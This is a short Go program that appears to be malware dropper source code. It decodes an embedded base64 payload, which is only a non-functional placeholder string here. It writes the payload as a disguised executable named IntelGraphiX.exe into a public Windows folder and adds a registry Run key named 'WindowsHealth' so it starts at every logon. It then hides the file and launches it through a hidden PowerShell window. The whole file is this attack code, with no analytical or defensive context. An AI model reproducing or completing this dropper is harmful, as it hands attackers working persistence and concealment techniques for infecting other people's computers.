package main

import (
    "fmt"
    "os"
    "runtime"
    "os/exec"
    "encoding/base64"
)

var (
    shell string
    flag  string
)

func init() {
    switch runtime.GOOS {
    case "windows":
        shell = "powershell"
        flag = "-c"
    default:
        shell = "bash"
        flag = "-c"
    }
}

func Popen(command string, args ...interface{}) {
    cmd := fmt.Sprintf(command, args...)
    process := exec.Command(shell, flag, cmd)
    process.Stdin = os.Stdin
    process.Stdout = os.Stdout
    process.Stderr = os.Stderr
    err := process.Run()
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error executing command: %v\n", err)
    }
}

func setRegistryPersistence(exePath string) {
    Popen(`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WindowsHealth /t REG_SZ /d "%s"`, exePath)
}

func main() {
    encodedExeData := "africanas"
    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error decoding base64 data: %v\n", err)
        return
    }

    exeOutputPath := `C:\Users\Public\Libraries\IntelGraphiX.exe`
    err = os.WriteFile(exeOutputPath, exeData, 0644)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error writing file: %v\n", err)
        return
    }

    setRegistryPersistence(exeOutputPath)

    Popen(`attrib +h "%s"`, exeOutputPath)
    Popen(`powershell -w 1 "%s"`, exeOutputPath)
}
